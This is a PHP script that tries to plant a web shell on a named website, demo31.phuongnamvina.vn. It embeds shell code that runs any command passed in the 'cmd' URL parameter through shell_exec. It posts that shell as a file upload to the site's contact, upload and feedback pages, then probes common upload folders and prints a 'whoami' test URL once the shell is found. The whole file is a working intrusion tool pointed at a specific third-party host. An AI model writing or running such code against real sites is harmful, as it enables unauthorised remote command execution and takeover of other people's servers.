<?php
echo "🚀 UPLOADING TO DEMO31.PHUONGNAMVINA.VN\n";
echo "=====================================\n\n";

$target = 'http://demo31.phuongnamvina.vn';
$shellName = 'test_shell.php';

// Simple shell
$shellContent = '<?php
echo "<h1>🇻🇳 Shell Active on Demo31</h1>";
echo "<p>Time: " . date("Y-m-d H:i:s") . "</p>";
echo "<p>SUCCESS!</p>";
if (isset($_GET["cmd"])) {
    echo "<pre>";
    echo htmlspecialchars($_GET["cmd"]) . "\n";
    if (function_exists("shell_exec")) {
        echo shell_exec($_GET["cmd"]);
    }
    echo "</pre>";
}
?>';

echo "🎯 Target: $target\n";
echo "💀 Shell: $shellName\n\n";

// Try simple upload
echo "📤 Attempting upload...\n";

$boundary = '----WebKitFormBoundary123456789';
$postData = "--$boundary\r\n";
$postData .= "Content-Disposition: form-data; name=\"file\"; filename=\"$shellName\"\r\n";
$postData .= "Content-Type: text/plain\r\n\r\n";
$postData .= $shellContent . "\r\n";
$postData .= "--$boundary--\r\n";

$uploadUrls = [
    '/contact.php',
    '/upload.php',
    '/feedback.php'
];

foreach ($uploadUrls as $url) {
    echo "🔄 Trying: $target$url\n";
    
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $target . $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $postData,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_USERAGENT => 'Mozilla/5.0',
        CURLOPT_HTTPHEADER => [
            'Content-Type: multipart/form-data; boundary=' . $boundary
        ]
    ]);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    if ($error) {
        echo "   ❌ Error: $error\n";
        continue;
    }
    
    echo "   📊 HTTP $httpCode\n";
    
    if ($httpCode >= 200 && $httpCode < 400) {
        echo "   ✅ Upload successful\n";
        
        // Check for shell in common locations
        $locations = [
            "/$shellName",
            "/uploads/$shellName",
            "/files/$shellName",
            "/tmp/$shellName"
        ];
        
        foreach ($locations as $location) {
            $testUrl = $target . $location;
            echo "   🔍 Testing: $testUrl\n";
            
            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL => $testUrl,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 10,
                CURLOPT_SSL_VERIFYPEER => false
            ]);
            
            $testResponse = curl_exec($ch);
            $testHttpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            
            if ($testHttpCode == 200 && strpos($testResponse, 'Shell Active') !== false) {
                echo "   🎉 FOUND SHELL: $testUrl\n";
                echo "   🔧 Test: $testUrl?cmd=whoami\n";
                break 2;
            } else {
                echo "   ❌ Not found (HTTP $testHttpCode)\n";
            }
        }
    } else {
        echo "   ❌ Upload failed\n";
    }
    echo "\n";
}

echo "🏁 Upload test completed\n";
?> 